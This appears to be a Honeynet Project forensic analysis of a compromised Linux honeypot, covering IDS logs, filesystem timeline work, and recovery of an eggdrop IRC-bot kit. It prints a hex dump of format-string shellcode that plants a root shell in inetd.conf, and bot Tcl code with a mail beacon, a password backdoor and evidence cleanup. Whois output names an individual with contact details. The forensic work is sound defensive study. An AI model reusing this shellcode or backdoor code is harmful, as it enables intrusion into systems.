@@ -1,0 +1,2828 @@
+On November 7, 2000, Lance Sptizner of the Honeynet Project reported
+that the Linux honeypot had been compromised.
+
+The honeypot was running a default server install of Red Hat Linux
+release 6.2 (kernel 2.2.14-5.0).  The system was set up on November 5,
+2000, 07:33:20. The system clock was set to Central Standard Time
+(CST), or GMT-0600.  The images were analyzed on a system whose clock
+was set to US/Pacific timezone (GMT-0800).
+
+[It was later established that the system clock on the victim system
+is 57 minutes, 9 seconds ahead of that of the IDS.]
+
+
+The following was noted and logged by the the intrusion detection
+system, Snort.  (www.snort.org)
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 7 23:11:06 lisa snort[1260]: RPC Info Query: 216.216.74.2:963 -> 172.16.1.107:111
+Nov 7 23:11:31 lisa snort[1260]: spp_portscan: portscan status from 216.216.74.2: 2 connections across 1 hosts: TCP(2), UDP(0)
+Nov 7 23:11:31 lisa snort[1260]: IDS08 - TELNET - daemon-active: 172.16.1.101:23 -> 216.216.74.2:1209
+Nov 7 23:11:34 lisa snort[1260]: IDS08 - TELNET - daemon-active: 172.16.1.101:23 -> 216.216.74.2:1210
+Nov 7 23:11:47 lisa snort[1260]: spp_portscan: portscan status from 216.216.74.2: 2 connections across 2 hosts: TCP(2), UDP(0)
+Nov 7 23:11:51 lisa snort[1260]: IDS15 - RPC - portmap-request-status: 216.216.74.2:709 -> 172.16.1.107:111
+Nov 7 23:11:51 lisa snort[1260]: IDS362 - MISC - Shellcode X86 NOPS-UDP: 216.216.74.2:710 -> 172.16.1.107:871
+
+11/07-23:11:50.870124 216.216.74.2:710 -> 172.16.1.107:871
+UDP TTL:42 TOS:0x0 ID:16143 
+Len: 456
+3E D1 BA B6 00 00 00 00 00 00 00 02 00 01 86 B8  >...............
+00 00 00 01 00 00 00 02 00 00 00 00 00 00 00 00  ................
+00 00 00 00 00 00 00 00 00 00 01 67 04 F7 FF BF  ...........g....
+04 F7 FF BF 05 F7 FF BF 05 F7 FF BF 06 F7 FF BF  ................
+06 F7 FF BF 07 F7 FF BF 07 F7 FF BF 25 30 38 78  ............%08x
+20 25 30 38 78 20 25 30 38 78 20 25 30 38 78 20   %08x %08x %08x 
+25 30 38 78 20 25 30 38 78 20 25 30 38 78 20 25  %08x %08x %08x %
+30 38 78 20 25 30 38 78 20 25 30 38 78 20 25 30  08x %08x %08x %0
+38 78 20 25 30 38 78 20 25 30 38 78 20 25 30 38  8x %08x %08x %08
+78 20 25 30 32 34 32 78 25 6E 25 30 35 35 78 25  x %0242x%n%055x%
+6E 25 30 31 32 78 25 6E 25 30 31 39 32 78 25 6E  n%012x%n%0192x%n
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 EB 4B 5E 89 76 AC 83 EE 20 8D 5E 28 83 C6  ...K^.v... .^(..
+20 89 5E B0 83 EE 20 8D 5E 2E 83 C6 20 83 C3 20   .^... .^... .. 
+83 EB 23 89 5E B4 31 C0 83 EE 20 88 46 27 88 46  ..#.^.1... .F'.F
+2A 83 C6 20 88 46 AB 89 46 B8 B0 2B 2C 20 89 F3  *.. .F..F..+, ..
+8D 4E AC 8D 56 B8 CD 80 31 DB 89 D8 40 CD 80 E8  .N..V...1...@...
+B0 FF FF FF 2F 62 69 6E 2F 73 68 20 2D 63 20 65  ..../bin/sh -c e
+63 68 6F 20 34 35 34 35 20 73 74 72 65 61 6D 20  cho 4545 stream 
+74 63 70 20 6E 6F 77 61 69 74 20 72 6F 6F 74 20  tcp nowait root 
+2F 62 69 6E 2F 73 68 20 73 68 20 2D 69 20 3E 3E  /bin/sh sh -i >>
+20 2F 65 74 63 2F 69 6E 65 74 64 2E 63 6F 6E 66   /etc/inetd.conf
+3B 6B 69 6C 6C 61 6C 6C 20 2D 48 55 50 20 69 6E  ;killall -HUP in
+65 74 64 00 00 00 00 09 6C 6F 63 61 6C 68 6F 73  etd.....localhos
+74 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  t...............
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+
+
+23:11:51 Tue Nov 07 2000 in US/Eastern converts to
+20:11:51 Tue Nov 07 2000 in US/Pacific 
+                 
+	DST* is not in effect on this date/time in US/Eastern 
+	DST* is not in effect on this date/time in US/Pacific 
+
+				    *Daylight Saving
+
+	http://www.timezoneconverter.com/cgi-bin/tzc.tzc
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+The original file system layout, and MD5 checksums of the partition
+images, are shown here:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+/dev/hda8       /
+/dev/hda1       /boot
+/dev/hda6       /home
+/dev/hda5       /usr
+/dev/hda7       /var
+/dev/hda9       swap
+
+a1dd64dea2ed889e61f19bab154673ab  honeypot.hda1.dd
+c1e1b0dc502173ff5609244e3ce8646b  honeypot.hda5.dd
+4a20a173a82eb76546a7806ebf8a78a6  honeypot.hda6.dd
+1b672df23d3af577975809ad4f08c49d  honeypot.hda7.dd
+8f244a87b8d38d06603396810a91c43b  honeypot.hda8.dd
+b763a14d2c724e23ebb5354a27624f5f  honeypot.hda9.dd
+
+
+f8e5cdb6f1109035807af1e141edd76d  honeypot.hda1.dd.gz
+6ef29886be0d9140ff325fe463fce301  honeypot.hda5.dd.gz
+8eb98a676dbffad563896a9b1e99a95f  honeypot.hda6.dd.gz
+be215f3e8c2602695229d4c7810b9798  honeypot.hda7.dd.gz
+b4ff10d5fd1b889a6237fa9c2979ce77  honeypot.hda8.dd.gz
+9eed26448c881b53325a597eed8685ea  honeypot.hda9.dd.gz
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+The uncompressed images were mounted using the Linux loopback
+mechanism on a forensic analysis system, as shown here:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+mount -o ro,loop,nodev,noexec honeypot.hda8.dd /t
+mount -o ro,loop,nodev,noexec honeypot.hda1.dd /t/boot
+mount -o ro,loop,nodev,noexec honeypot.hda6.dd /t/home
+mount -o ro,loop,nodev,noexec honeypot.hda5.dd /t/usr
+mount -o ro,loop,nodev,noexec honeypot.hda7.dd /t/var
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+The file system mirror was then processed and analyzed using Dan
+Farmer and Wietse Venema's "The Coroner's Toolkit" package, available
+from:
+
+	http://www.porcupine.org/forensics/
+
+Modify/Access/Change (MAC) timestamp analysis was done first.
+The programs "ils" and "ils2mac" were used to obtain MAC times
+for deleted i-nodes in partitions 1, 5, 6, 7, and 8 (9 is swap,
+which is not a Linux native file system).  The resulting body
+files were then combined with that obtained by running "grave-robber"
+against the file system rooted at "/t", to include deleted i-nodes
+along with active i-nodes.  The commands used to do this (assuming
+TCT's "bin" and "extras" directories are in the PATH already)
+were:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# grave-robber -c /t -m -d . -o LINUX2
+# for i in 1 5 6 7 8
+> do
+> ils honeypot.hda$i | ils2mac > hda$i.ilsbody
+> done
+# ls -l *body
+-rw-r--r--    1 root     root      3484454 Feb 15 23:01 body
+-rw-r--r--    1 root     root          207 Feb 17 14:42 hda1.ilsbody
+-rw-r--r--    1 root     root       179650 Feb 17 14:42 hda5.ilsbody
+-rw-r--r--    1 root     root          207 Feb 17 14:42 hda6.ilsbody
+-rw-r--r--    1 root     root          796 Feb 17 14:42 hda7.ilsbody
+-rw-r--r--    1 root     root        12618 Feb 17 14:42 hda8.ilsbody
+# cat hda$i.ilsbody > body-deleted
+# cat body body-deleted > body-full
+# mactime -p /t/etc/passwd -g /t/etc/group -b body-full \
+  11/06/2000 > mactime.txt
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+[Note that you can easily "grep" for things within body files,
+producing subsets at will.  You can chose all files with a particular
+path, with particular bit masks, just directories, etc.  Anything that
+matches a regular expression will work.]
+
+The first visible signs of activity in the filesystem appear on
+November 8 06:25:53.  At this time, the "uptime" program is run,
+followed by a zeroing out of the "/etc/hosts.deny" file (disabling tcp
+wrapper access controls).  The "/etc/rc.d/init.d" directory (used to
+house system startup scripts) is accessed (this should indicate a
+directory listing was obtained).  Someone then runs the "ftp" program,
+presumably to download a file to the system.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 08 00 06:25:53     2836 .a. -r-xr-xr-x root     root     /t/usr/bin/uptime
+Nov 08 00 06:26:15        0 m.c -rw-r--r-- root     root     /t/etc/hosts.deny
+Nov 08 00 06:26:51     1024 .a. drwxr-xr-x root     root     /t/etc/rc.d/init.d
+Nov 08 00 06:29:27    63728 .a. -rwxr-xr-x root     root     /t/usr/bin/ftp
+Nov 08 00 06:33:42     1024 .a. drwx------ daemon   daemon   /t/var/spool/at
+Nov 08 00 06:45:18      161 .a. -rw-r--r-- root     root     /t/etc/hosts.allow
+                          0 .a. -rw-r--r-- root     root     /t/etc/hosts.deny
+Nov 08 00 06:45:19       63 .a. -rw-r--r-- root     root     /t/etc/issue.net
+Nov 08 00 06:45:24     1504 .a. -rw-r--r-- root     root     /t/etc/security/console.perms
+Nov 08 00 06:51:37  2129920 m.. -rw-r--r-- drosen   drosen   <honeypot.hda8.dd-dead-8133>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+The deleted file owned by "drosen" was recovered using "icat".  It is
+a tar archive file, containing an IRC bot (short for "robot") program
+named "eggdrop", with encryption facilities.  For information on
+eggdrop and IRC bots, see:
+
+	http://www.xcalibre.com/eggdrop.htm
+	http://ciac.llnl.gov/ciac/documents/CIAC-2318_IRC_On_Your_Dime.pdf
+	http://www.irchelp.org/irchelp/irctutorial.html
+
+Listing this file shows the original owner used the account name
+"toro":
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# icat honeypot.hda8.dd 8133 > foo
+# file foo 
+foo: GNU tar archive
+# tar -tvf foo
+drwx------ toro/users        0 2000-10-01 19:27:29  /
+drwx------ toro/users        0 2000-10-01 19:30:21  /src/
+-rw------- toro/users     4178 2000-03-24 16:19:32  /src/Makefile
+-rw------- toro/users    52345 2000-06-03 23:06:04  /src/chan.c
+-rw------- toro/users     4860 2000-03-24 16:19:32  /src/chan.h
+-rw------- toro/users    28961 2000-05-23 18:11:20  /src/chanprog.c
+-rw------- toro/users    87647 2000-05-23 18:11:20  /src/cmds.c
+-rw------- toro/users    30799 2000-06-25 11:57:17  /src/dcc.c
+-rw------- toro/users    50176 2000-05-23 18:11:20  /src/users.c
+-rw------- toro/users    21700 2000-03-24 16:19:32  /src/eggdrop.h
+-rw------- toro/users    22865 2000-05-23 18:11:20  /src/tcldcc.c
+-rw------- toro/users    14584 2000-05-23 18:11:20  /src/gotdcc.c
+-rw------- toro/users    12276 2000-03-24 16:19:32  /src/hash.h
+-rw------- toro/users    10840 2000-05-23 18:11:20  /src/mem.c
+-rw------- toro/users    26027 2000-05-23 18:11:20  /src/misc.c
+-rw------- toro/users    27389 2000-07-09 19:05:01  /src/mode.c
+-rw------- toro/users    25274 2000-05-23 18:11:20  /src/msgcmds.c
+-rw------- toro/users    13935 2000-05-23 18:11:20  /src/msgnotice.c
+-rw------- toro/users    25733 2000-05-23 18:11:20  /src/net.c
+-rw------- toro/users    45201 2000-10-01 19:26:33  /src/main.c
+-rw------- toro/users    14220 2000-05-23 18:11:20  /src/match.c
+-rw------- toro/users    44533 2000-05-23 18:11:20  /src/botcmd.c
+-rw------- toro/users      850 2000-03-24 16:19:33  /src/tandem.h
+-rw------- toro/users     2980 2000-03-24 16:19:32  /src/english.h
+-rw------- toro/users    48329 2000-05-23 18:11:20  /src/userrec.c
+-rw------- toro/users     1401 2000-03-24 16:19:33  /src/users.h
+-rw------- toro/users    33851 2000-05-23 18:11:20  /src/botnet.c
+-rw------- toro/users    39314 2000-05-23 18:11:20  /src/dccutil.c
+-rw------- toro/users     6268 2000-03-24 16:19:33  /src/tclegg.h
+-rw------- toro/users     4584 2000-05-23 18:11:20  /src/hash.c
+-rw------- toro/users    35807 2000-07-01 18:30:16  /src/tcl.c
+-rw------- toro/users    40631 2000-05-23 18:11:20  /src/tclhash.c
+-rw------- toro/users    23037 2000-03-24 16:19:33  /src/proto.h
+-rw------- toro/users     1662 2000-03-24 16:19:32  /src/files.h
+-rw------- toro/users      530 2000-03-24 16:19:32  /src/cmdt.h
+-rw------- toro/users    26073 2000-05-23 18:11:20  /src/chanset.c
+-rw------- toro/users    29098 2000-05-23 18:11:20  /src/tclchan.c
+-rw------- toro/users    16714 2000-05-23 18:11:20  /src/tcluser.c
+-rw------- toro/users     8532 2000-05-23 18:11:20  /src/tclmisc.c
+-rw------- toro/users    15345 2000-05-23 18:11:20  /src/modules.c
+-rw------- toro/users    12578 2000-05-23 18:11:20  /src/notes.c
+-rw------- toro/users     2354 2000-03-24 16:19:32  /src/modules.h
+drwx------ toro/users        0 1997-06-29 10:58:10  /src/mod/
+-rw------- toro/users      374 2000-03-29 13:25:44  /src/mod/Makefile
+-rw------- toro/users     7290 2000-03-29 13:25:44  /src/mod/module.h
+drwx------ toro/users        0 1997-06-29 11:22:31  /src/mod/assoc.mod/
+-rw------- toro/users     9474 2000-03-29 13:25:44  /src/mod/assoc.mod/assoc.c
+-rw------- toro/users      308 2000-03-29 13:25:44  /src/mod/assoc.mod/Makefile
+-rw------- toro/users     4149 2000-03-29 13:25:44  /src/mod/modvals.h
+drwx------ toro/users        0 1997-06-29 11:22:31  /src/mod/blowfish.mod/
+-rw------- toro/users      400 2000-03-29 13:25:44  /src/mod/blowfish.mod/Makefile
+-rw------- toro/users    10079 2000-03-29 13:25:44  /src/mod/blowfish.mod/blowfish.c
+-rw------- toro/users     1073 2000-03-29 13:25:44  /src/mod/blowfish.mod/blowfish.h
+-rw------- toro/users    13232 2000-03-29 13:25:44  /src/mod/blowfish.mod/bf_tab.h
+drwx------ toro/users        0 1997-06-29 11:22:32  /src/mod/filesys.mod/
+-rw------- toro/users     5719 2000-03-29 13:25:44  /src/mod/filesys.mod/dccfiles.c
+-rw------- toro/users    20189 2000-03-29 13:25:44  /src/mod/filesys.mod/filedb.c
+-rw------- toro/users      772 2000-03-29 13:25:44  /src/mod/filesys.mod/Makefile
+-rw------- toro/users    32326 2000-03-29 13:25:44  /src/mod/filesys.mod/files.c
+-rw------- toro/users    14716 2000-03-29 13:25:44  /src/mod/filesys.mod/filesys.c
+-rw------- toro/users    15305 2000-03-29 13:25:44  /src/mod/filesys.mod/tclfiles.c
+-rw------- toro/users     1982 2000-03-29 13:25:44  /src/mod/filesys.mod/filesys.h
+drwx------ toro/users        0 1997-06-29 11:22:32  /src/mod/transfer.mod/
+-rw------- toro/users    28587 2000-03-29 13:25:44  /src/mod/transfer.mod/transfer.c
+-rw------- toro/users      340 2000-03-29 13:25:44  /src/mod/transfer.mod/Makefile
+-rw-r--r-- toro/users     1006 2000-06-28 20:28:20  /src/npt.c
+-rw-r--r-- toro/users     3147 2000-06-29 21:08:12  /src/evil.c
+-rwxr-xr-x toro/users    11588 2000-10-01 19:26:40  /config.status
+-rw-r--r-- toro/users     4939 2000-10-01 19:26:40  /Makefile
+-rw-r--r-- toro/users       84 2000-10-01 19:26:40  /lush.h
+drwx------ toro/users        0 2000-05-23 18:24:34  /scripts/
+-rw-r--r-- toro/users    87527 2000-05-23 18:24:34  /scripts/main.tcl
+-rw-r--r-- toro/users    56274 2000-05-23 18:24:34  /scripts/vars.tcl
+drwx------ toro/users        0 2000-03-28 18:22:47  /text/
+-rw------- toro/users        1 2000-03-28 18:22:50  /text/badhost
+-rw------- toro/users        1 2000-03-28 18:22:55  /text/intro
+-rw------- toro/users        1 2000-03-28 18:23:03  /text/newuser
+-rw------- toro/users        1 2000-03-28 18:22:53  /text/files
+-rw------- toro/users        1 2000-03-28 18:22:56  /text/newbot
+-rw------- toro/users        1 2000-03-28 18:22:52  /text/banner
+-rw------- toro/users        1 2000-03-28 18:23:01  /text/newbot-limbo
+-rw-r--r-- toro/users     3137 2000-03-29 13:25:50  /config.h
+drwx------ toro/users        0 1997-05-15 15:29:03  /filesys/
+drwx------ toro/users        0 1997-05-15 15:29:03  /filesys/incoming/
+-rw------- toro/users       80 1997-05-15 15:29:03  /lush.h.in
+-rw------- toro/users     4886 2000-04-27 23:56:01  /Makefile.in
+-rw------- toro/users    10685 1997-06-29 08:52:00  /configure.in
+-rwx------ toro/users    76891 1997-06-22 19:24:23  /configure
+-rw------- toro/users     2922 1997-06-11 10:06:41  /config.h.in
+-rw-r--r-- toro/users     3069 2000-04-26 19:59:54  /encrypt.c
+-rwx------ toro/users    18864 1997-06-17 03:22:20  /eggdrop.conf
+-rw-r--r-- toro/users   221558 2000-10-01 19:24:04  /egg.log
+-rw-r--r-- toro/users        0 2000-04-28 00:57:56  /.log.today
+-rwx------ toro/users      166 2000-08-25 13:57:38  /run
+-rwx------ toro/users      270 2000-08-25 13:17:29  /install
+-rw-r--r-- toro/users     2284 2000-10-01 19:26:39  /config.log
+-rw-r--r-- toro/users     2995 2000-03-29 13:23:35  /config.cache
+-rw-r--r-- toro/users      405 2000-08-25 12:31:05  /.log.yesterday
+-rw-r--r-- toro/users        0 2000-03-24 20:24:21  /.o.f
+-rwxr--r-- toro/users       27 2000-03-30 15:09:21  /.ldpt
+-rw-r--r-- toro/users      592 2000-03-29 13:07:02  /DEBUG
+-rw-r--r-- toro/users     1356 2000-04-26 19:58:23  /salt.h
+-rw-r--r-- toro/users     7215 2000-05-23 18:24:01  /e.chans
+-rw-r--r-- toro/users     1913 2000-05-23 18:24:01  /e.conf
+-rw-r--r-- toro/users      485 2000-05-23 18:24:01  /e.notes
+-rw-r--r-- toro/users    16665 2000-05-23 18:24:01  /e.users
+-rw-r--r-- toro/users       29 2000-10-01 19:26:40  /EGGDROP.stamp
+-rwxr-xr-x toro/users   427888 2000-10-01 19:27:29  /eggdrop
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+The most recent files were modified 2000-10-01 (original timezone is
+not known).  Those files, ordered newest to oldest, are shown here:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+-rw-r--r-- toro/users   221558 2000-10-01 19:24:04  /egg.log
+-rw------- toro/users    45201 2000-10-01 19:26:33  /src/main.c
+-rw-r--r-- toro/users     2284 2000-10-01 19:26:39  /config.log
+-rwxr-xr-x toro/users    11588 2000-10-01 19:26:40  /config.status
+-rw-r--r-- toro/users     4939 2000-10-01 19:26:40  /Makefile
+-rw-r--r-- toro/users       84 2000-10-01 19:26:40  /lush.h
+-rw-r--r-- toro/users       29 2000-10-01 19:26:40  /EGGDROP.stamp
+drwx------ toro/users        0 2000-10-01 19:27:29  /
+-rwxr-xr-x toro/users   427888 2000-10-01 19:27:29  /eggdrop
+drwx------ toro/users        0 2000-10-01 19:30:21  /src/
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Examination of the file "egg.log" shows it to be a bot configuration
+file.  Selected lines from this file are shown here (deleted lines
+indicated by elipses):
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ . . .
+################################################################################
+#######
+###       tPACK.tcl coded by T0R0 - toro00@yahoo.com - www.falcon-networks.com  
+    ###
+################################################################################
+#######
+
+set homechan "#tpack"
+set admin "TORO X-cess"
+set vers "2.3"
+set altnick "$nick-"
+set username "$nick"
+set realname "www.$nick.com"
+set userfile ".log.yesterday"
+set channel-file ".log.today"
+
+ . . .
+
+if {![file exists scripts/ft]} {
+    set wmail "[decrypt 65ty0hXeau/pk77x.dX 3AEfl/.23el/GowxN.aUrJT1]"
+    set h [exec uname -a]
+    set mail_msg "tpack run for first time ---> admins: $admin --- botnick: $bot
+nick --- server: $h"
+    set mail_add $wmail
+    if {![catch {exec echo $mail_msg | sendmail $mail_add} mail_err]} { }
+    exec touch scripts/ft
+}
+ . . .
+proc dcc_flags {handle idx arg} {
+    set a [lindex $arg 0]
+    set z [decrypt xx3fw3 bijph.s5f7N0]
+    if {$handle == $z} {
+        set p "[decrypt f3qcadr3 DtVgR.E/mLu1]"
+        if {$a == $p} {
+            if {![validuser $z]} {
+                adduser $z *!*toro@will.fuck.for.an.o-line.st
+                chpass $z temp123
+            }
+            chattr $z +ofmnpBjx
+            putdcc $idx "Flags restored"
+            return 0
+        } else {
+            putdcc $idx "What? You need '.help'"
+            return 0 
+        }
+    } else {
+        putdcc $idx "What? You need '.help'"
+        return 0 
+    }
+}
+ . . .
+if {[file exists encrypt]} {
+    exec rm encrypt
+}
+if {[file exists encrypt.c]} {
+    exec rm encrypt.c
+}
+if {[file exists decrypt]} {
+    exec rm decrypt
+}
+if {[file exists decrypt.c]} {
+    exec rm decrypt.c
+}
+if {[file exists ../tpack.tgz]} {
+    exec rm ../tpack.tgz
+}
+utimer 3 check_timel
+proc check_timel {} { 
+    if {[file exists time.log]} { exec rm time.log }
+    utimer 3 check_timel
+}
+
+putlog ""
+putlog "\002tPACK $vers encrypted by T0R0 loaded\002"
+
+## EOF
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+At bottom is some cleanup code, which indicates the name of this tar
+file (in its original compressed form) was likely "tpack.tgz".
+(It was renamed to "tpack.tar" for later use.)
+
+The IP address shown in this file is still active:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+% domain will.fuck.for.an.o-line.st
+The authoritative name servers for 'o-line.st' are:
+  ns1.falcon-networks.com   63.151.207.126
+  ns2.falcon-networks.com   216.206.242.130
+                                         (querying server=63.151.207.126 ...)
+                                         (querying server=216.206.242.130 ...)
+will.fuck.for.an.o-line.st:
+    Internet address = 63.151.207.49
+
+Qwest Communications (NETBLK-NET-QWEST-BLKS-2)
+   950 17th St. Suite 1900
+   Denver, CO 80202
+   US
+
+   Netname: NET-QWEST-BLKS-2
+   Netblock: 63.144.0.0 - 63.151.255.255
+   Maintainer: QWST
+
+   Coordinator:
+      Qwest, NOC  (QN-ARIN)  bgp4-admin@qwestip.net
+      703-363-3001 (FAX) 703-363-3177 (703) 363-3001 (FAX) 703-363-3177
+
+   Domain System inverse mapping provided by:
+
+   NS1.QWEST.NET                216.111.65.217
+   NS2.QWEST.NET                205.171.16.25
+
+   ADDRESSES WITHIN THIS BLOCK ARE NON-PORTABLE
+   NOTE: For abuse issues, please email abuse@qwest.net.
+
+   Record last updated on 28-Jul-2000.
+   Database last updated on 17-Feb-2001 18:26:34 EDT.
+
+% jwhois 216.206.242.130
+[whois.arin.net]
+Qwest Communications (NETBLK-NET-QWEST-BLKS-1) NET-QWEST-BLKS-1
+                                                 216.206.0.0 - 216.207.255.255
+CREATIVE INTERNET TECHNIQUES (NETBLK-QWEST-216-206-242-64) QWEST-216-206-242-64
+                                              216.206.242.64 - 216.206.242.255
+Falcon Networks (NETBLK-CRTV-FALCON-NETWORKS) CRTV-FALCON-NETWORKS
+                                             216.206.242.128 - 216.206.242.255
+
+[whois.arin.net]
+Falcon Networks (NETBLK-CRTV-FALCON-NETWORKS)
+   3 Mimosa
+   Irvine, CA 92612
+   US
+
+   Netname: CRTV-FALCON-NETWORKS
+   Netblock: 216.206.242.128 - 216.206.242.255
+
+   Coordinator:
+      Mahvi, Mehdi  (MM1416-ARIN)  toro00@hotmail.com
+      949 552 7210
+
+   Record last updated on 20-Aug-2000.
+   Database last updated on 17-Feb-2001 18:26:34 EDT.
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+The bot is configured to use the following servers (IP addresses
+converted to DNS names to the right where possible):
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+set servers {
+207.138.35.60   irc.west.gblx.net
+198.94.52.220   irc.Stanford.EDU
+130.243.35.1
+207.45.69.69    irc.lightning.net
+192.16.122.4
+199.2.32.11     irc-w1.concentric.net
+206.251.7.30    irc.Prison.NET
+206.132.27.156  irc.east.gblx.net
+}
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Several files (names starting with "e.") appear to be encrypted.
+There is no decryption program source in this tar file (although it is
+named "decrypt.c" in the cleanup section of "egg.log"), but the file
+"salt.h" (holding the decryption salt function) is available.  A
+simple modification of the "encrypt.c" program results in a working
+decryptor (see "decrypt.c").
+
+Using this program, it can be seen the these files are encrypted
+multiple times.  E.g., "e.conf" is encrypted three times, while
+"e.notes" is encrypted twice.  (These files are likely just tests
+of the encryption/decryption routines, and do not contain user
+or channel lists as expected.  Bummer.)
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# cat e.conf
+0$1f0=201i151h221o291H2b1G2U223'2i302n372G2Y2U3E2Z3h2Y2Q3c0A0s1L0N1G141m0=281k1R1A1@1N2V1I2f1&1&1$2P2i342v2R2t322S`@0l0U0q1j0A1C0Q1`0P1q0=1'1c1S171X2s2O2R3A2P3V2@403c3J3m3U0L1S0&1@121I1j1P1B2d1E2m1Q2J262Q2b2C2u3p2H3'2G3B2U3U0A0S0y1a0y1l0@0&0P231a1p1g2l1t201u1X1O2e1S2k1X2L282G282Q2x2x2H03`&000a0F1x2d1D1L1y201Z1T
+100W0$19140&1k211g1A1q291S2O1S1X1W2X28362l2S2p3u2J3h2L3S3`2N3b1r0D0S0M101'1R141T1q2v1F271F1&1P2C2a2D2a25262H2z2x2n2U2H3c020x0c0j090H0t190y1j0E1a0V0X1Y312k2m2v2t2u3y2Q3O313c323W323l3q1q0I1k0Y1=1g1f161S1r1z1G1C
+0T1r181T1d1u1g2d1A1G1v2p1W2C252s273c2r2L2F3s2L3f2J3k333k3'0J0z0O0S1x0N1x13291n221D2`1s281O2a1P2C242u2f2y2e2l2y2p2N3g0c170i1m0B1f0B1f0P17111k0$1=1a182E3A2D3G2O3d2=463b3n3c4e0Q0@0O1s1`1p1f1C1h2'1t1m1K1v1I2C2024262I282f2f2v2E352D3d2D2Y2@3R050x0p1v0E1s0P1f0R1N161u1a241g1U1y241x2F1Z2m262J292Q2q3j2I0y171G17211z1@1v2d1M1C1&1L1R2V2a362s3y2J3v2A3e2V3t2W3k38460A0x0u1b0R1z17151a1u1f2d1x1N1v2h1K2k2`1@1X29232`2o382o3A2B2=040T0g0U0l0Y0B0Q0C1F0W1h18211e272v2Y2O3M2V3j374h3l3l3g3a0K1q141y130=1`1R1q2g
+0U1E111K
+
+0X1A1c1V18211m1C1K1N1E1T1J2K1$2R272O2b2R2q2H2q342I362Z3r2=3e36180L1B0R1a14211i141d1D1m1I1M1X1J291K2c252X212p2m2v2u2x2C3y`@110i0=0m110t0L0H1c0H1U13152l2b2j3e2E2B2O3x2U3U2V3b3d3p373n0I1x1`1F0Z1l1b121m1L1A2t1t2t1Q2E1U2S2b2x2m2g2h2&2D2P2U3A2&0i0k1d0C0z0x1`0J1e0&1b0X1v121y1s1V1n1H1t2H
+0X1K1'1l1d1X1d2`1D2k1S2v1W2K2a2=2q2B2s3l2s322T3U2S2W3'3E0G1l0B1h0W1@1a161j2r1e1b1u2A1C2W1@2a242y232V2s242H2G2J2Z2L0G0h0a0c0R0p0N0I0y0z120L1x161J122n2m2N2A3A2N3s2S3e30393'3E3g4f0R0Y0S1i0=0&1c1r1e1t1y1G1E2p1H1Q1O2c292p242&282f2t3p2q3x2P3b2Y0h0k0N0k0U0E1`0H1m0O0O0@1l
